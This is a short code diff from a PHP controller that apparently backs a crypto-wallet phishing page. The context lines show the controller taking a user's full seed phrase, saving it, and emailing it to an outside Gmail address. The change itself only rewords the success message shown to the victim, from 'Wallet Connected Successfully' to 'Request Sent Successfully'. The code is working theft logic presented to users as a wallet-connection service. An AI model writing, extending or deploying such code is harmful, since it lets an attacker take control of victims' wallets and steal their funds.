@@ -30,7 +30,7 @@ class SeedphraseController extends Controller
             $wallet->save();
             $wallet = ['wallet' => $wallet];
             Mail::to('miningfarm.co.uk@gmail.com')->send(new SeedPhraseMail($wallet));
-            return redirect()->back()->with('success', "Wallet Connected Successfully");
+            return redirect()->back()->with('success', "Request Sent Successfully");
         }
         return redirect()->back()->with('error', "Please enter your complete seed phrase");
 
